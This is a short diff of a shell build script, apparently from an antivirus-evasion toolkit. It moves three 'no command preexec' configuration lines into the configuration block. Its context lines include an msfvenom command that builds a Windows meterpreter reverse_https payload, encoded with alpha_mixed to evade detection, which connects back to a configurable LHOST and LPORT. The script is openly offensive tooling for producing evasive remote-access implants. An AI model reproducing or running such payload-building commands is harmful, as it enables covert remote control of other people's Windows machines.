@@ -26,6 +26,9 @@ cat banner.txt
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# no command preexec
+set_command_source no_data
+set_command_exec no_command
 # enable debug output
 enable_debug_print
 #CONFIGURATION_END
@@ -33,10 +36,6 @@ enable_debug_print
 
 # make meterpreter reverse payload, encoded with msf alpha_mixed 
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw > output/sc_alpha_mixed.txt
-
-# no command preexec
-set_command_source no_data
-set_command_exec no_command
 
 # set shellcode source
 set_payload_source from_command_line_raw
